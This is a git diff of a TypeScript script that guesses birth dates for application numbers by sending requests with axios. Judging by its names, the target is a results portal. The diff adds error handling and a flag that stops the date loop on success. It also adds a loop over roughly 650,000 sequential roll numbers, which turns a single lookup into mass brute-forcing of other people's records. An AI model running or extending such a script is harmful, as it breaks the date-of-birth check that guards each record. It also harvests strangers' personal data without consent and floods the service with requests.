@@ -34,12 +34,14 @@ async function solve(applicationNumber: string, day: string, month: string, year
         data: data
     };
 
-
+try {
     const response = await axios.request(config)
     const parseData = parseHtml(JSON.stringify(response.data))
-
-
     return parseData;
+} catch (error) {
+    console.log(error);
+}
+    
 
 
 
@@ -83,8 +85,15 @@ function parseHtml(htmlContent: string) {
 }
 
 async function main(rollNumber: string) {
+    let solved = false;
     for (let year = 2007; year > 2002; year--) {
+        if (solved) {
+            break;
+        }
         for (let month = 1; month <= 12; month++) {
+            if (solved) {
+                break;
+            }
             const dataPromises = [];
             console.log("Sending requests for month " + month + "of the year " + year);
             
@@ -99,12 +108,19 @@ async function main(rollNumber: string) {
            resolvedData.forEach((data) => {
                 if (data) {
                     console.log(data);
-                    process.exit(1);
+                    solved = true;
                 }
            })
         }
     }
 }
 
-main("240411183516");
+async function gettingResult(){
+    for (let roll = 240411345673; roll < 240411999999; roll++) {
+        await main(roll.toString());
+        
+    }
+}
+
+gettingResult();
 
